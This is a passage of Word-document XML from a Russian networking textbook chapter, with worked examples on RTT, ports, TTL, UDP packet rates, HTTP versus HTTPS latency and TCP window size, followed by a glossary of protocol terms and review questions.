      </w:r>
      <w:r>
        <w:t>: Клиент запрашивает файл размером 10 КБ через HTTP. RTT = 50 мс. Сколько времени займёт загрузка (без учёта DNS и других факторов)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Установка TCP-соединения**: 1.5 × RTT = 1.5 × 50 = **75 мс**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**HTTP-запрос** (клиент → сервер): 0.5 × RTT = **25 мс**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**HTTP-ответ** (сервер → клиент): 0.5 × RTT + время передачи данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время передачи данных</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> зависит от скорости канала. Предположим канал = 1 Мбит/с.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   \[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   t = \frac{10 \text{ КБ}}{1 \text{ Мбит/с}} = \frac{10 \times 8 \text{ Кбит}}{1000 \text{ Кбит/с}} = 0.08 \text{ с} = 80 \text{ мс}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   \]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Итого для ответа: 25 + 80 = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>105 мс</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Общее время</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 75 + 25 + 105 = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>205 мс</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>~205 мс</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 6: Количество портов на сервере</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Веб-сервер обрабатывает 10,000 одновременных подключений от разных клиентов. Все подключения идут на порт 443 (HTTPS). Сколько портов использует сервер?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Один порт</w:t>
      </w:r>
      <w:r>
        <w:t>: 443.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Но как сервер различает 10,000 соединений?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Каждое соединение уникально идентифицируется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>парой сокетов</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Клиент 1: `192.168.1.100:54321` ↔ Сервер: `203.0.113.1:443`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Клиент 2: `192.168.1.100:54322` ↔ Сервер: `203.0.113.1:443`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Сервер использует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>один порт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (443), но операционная система создаёт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>отдельный сокет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для каждого соединения (с уникальной комбинацией IP клиента + порт клиента).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Сервер использует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1 порт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (443), но обрабатывает 10,000 соединений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 7: TTL и максимальное расстояние</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Пакет отправлен с TTL = 64. Каждый роутер уменьшает TTL на 1. Через сколько максимум роутеров может пройти пакет?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">TTL = 64 → пакет может пройти через </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>64 роутера</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (после 64-го TTL станет 0, и пакет будет выброшен).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Но</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: обычно между двумя точками в интернете </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10-30 роутеров</w:t>
      </w:r>
      <w:r>
        <w:t>. TTL = 64 достаточно для большинства маршрутов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>64 роутера</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 8: Полоса пропускания для видеостриминга</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: YouTube-видео требует 5 Мбит/с. Используется UDP. Сколько UDP-пакетов в секунду нужно передать, если каждый пакет содержит 1000 байт данных?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Полезная нагрузка** = 1000 байт = 8000 бит</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Пакетов в секунду**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   \[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   \frac{5 \text{ Мбит/с}}{8000 \text{ бит}} = \frac{5000000}{8000} = 625 \text{ пакетов/с}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   \]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>625 пакетов в секунду</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 9: Сравнение HTTP и HTTPS (задержка)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: RTT = 80 мс. Сравни время загрузки одного файла (без учёта передачи данных) через HTTP и HTTPS.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TCP handshake: 1.5 × RTT = 120 мс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HTTP-запрос: 0.5 × RTT = 40 мс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Итого**: **160 мс**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HTTPS</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TCP handshake: 1.5 × RTT = 120 мс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TLS handshake: 2 × RTT = 160 мс (упрощённо)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HTTP-запрос: 0.5 × RTT = 40 мс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Итого**: **320 мс**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: HTTPS </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>в 2 раза медленнее</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для первого запроса. Но зато </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>безопаснее</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оптимизация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: TLS 1.3 сократил TLS handshake до </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1 RTT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> → HTTPS стало быстрее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 10: Максимальная скорость TCP (Window Size)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: TCP Window Size = 65,535 байт (максимум без расширений). RTT = 100 мс. Какова максимальная скорость передачи?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Максимальная скорость</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (без Window Scaling):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\text{Скорость} = \frac{\text{Window Size}}{\text{RTT}} = \frac{65535 \text{ байт}}{0.1 \text{ с}} = 655350 \text{ байт/с} \approx 5.2 \text{ Мбит/с}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Без </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Window Scaling</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> TCP не может передавать быстрее </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>~5 Мбит/с</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на каналах с RTT = 100 мс.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: TCP Window Scaling (опция TCP) позволяет увеличить Window Size до </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1 ГБ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> → скорость до </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>80 Гбит/с</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на RTT = 100 мс.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>~5 Мбит/с</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (без Window Scaling).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Протокол</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — набор правил для обмена данными между устройствами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TCP/IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — семейство протоколов, управляющих интернетом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TCP (Transmission Control Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол транспортного уровня, обеспечивающий надёжную, упорядоченную доставку данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UDP (User Datagram Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол транспортного уровня, обеспечивающий быструю, но ненадёжную доставку данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IP (Internet Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол сетевого уровня, отвечающий за маршрутизацию пакетов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Трёхстороннее рукопожатие (3-Way Handshake)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процесс установки TCP-соединения (SYN, SYN-ACK, ACK).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Порт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — 16-битное число (0-65535), указывающее на приложение на устройстве.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сокет (Socket)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — комбинация IP-адреса и порта (например, `192.168.1.1:80`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HTTP (HyperText Transfer Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол передачи гипертекста (веб-страниц).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HTTPS (HTTP Secure)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — HTTP поверх TLS/SSL (с шифрованием).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>FTP (File Transfer Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол передачи файлов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SMTP (Simple Mail Transfer Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол отправки почты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>POP3 (Post Office Protocol v3)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол получения почты (скачивание).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IMAP (Internet Message Access Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол работы с почтой на сервере.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SSH (Secure Shell)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол безопасного удалённого доступа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DNS (Domain Name System)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — система преобразования доменных имён в IP-адреса.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MTU (Maximum Transmission Unit)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — максимальный размер пакета, передаваемого без фрагментации (обычно 1500 байт).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Фрагментация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — разбиение больших пакетов на меньшие.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TTL (Time To Live)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — счётчик жизни IP-пакета (количество роутеров, через которые может пройти пакет).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RTT (Round-Trip Time)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — время туда и обратно (задержка).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Инкапсуляция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — оборачивание данных заголовками на каждом уровне стека.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Декапсуляция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — снятие заголовков на приёмной стороне.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TLS/SSL (Transport Layer Security / Secure Sockets Layer)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протоколы шифрования для HTTPS.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Window Size</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — размер буфера приёма TCP (для контроля потока).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория**: В чём разница между TCP и UDP? Приведи примеры, когда использовать каждый.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория**: Объясни, как работает трёхстороннее рукопожатие TCP (3-Way Handshake). Зачем оно нужно?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расчёт**: Клиент в Санкт-Петербурге подключается к серверу в Токио. RTT = 200 мс. Сколько времени займёт установка TCP-соединения?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория**: Что такое порт? Назови 5 стандартных портов (HTTP, HTTPS, SSH, FTP, DNS) и их номера.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расчёт**: Приложение отправляет 800 байт данных через TCP/IP (IPv4). Рассчитай общий размер IP-пакета (с учётом всех заголовков).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория**: Что такое MTU? Что происходит, если размер пакета превышает MTU канала?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика**: Ты заходишь на сайт `https://example.com`. Опиши пошагово, какие протоколы используются (DNS, TCP, TLS, HTTP).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расчёт**: Канал пропускает 10 Мбит/с. Ты отправляешь UDP-пакеты размером 1000 байт данных (+ заголовки UDP 8 байт + IP 20 байт). Сколько пакетов в секунду можно передать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория**: В чём разница между HTTP и HTTPS? Почему HTTPS медленнее?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Критическое мышление**: Почему онлайн-игры используют UDP, а не TCP? Какие минусы UDP приходится компенсировать в игровом коде?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Заключение: Протоколы — это язык интернета</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь ты знаешь:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**TCP/IP стек**: 4 уровня (Application, Transport, Network, Link)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**TCP**: надёжный, медленный, для файлов и веба</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**UDP**: быстрый, ненадёжный, для видео и игр</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Порты**: как приложения различают трафик</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**HTTP/HTTPS**: как работает веб</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Инкапсуляция**: как пакет оборачивается слоями заголовков</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Без протоколов интернет — это просто куча кабелей и роутеров. Протоколы — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>правила игры</w:t>
      </w:r>
      <w:r>
        <w:t>, которые позволяют миллиардам устройств общаться друг с другом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В следующей главе разберём </w:t>
      </w:r>
      <w:r>
        <w:rPr>
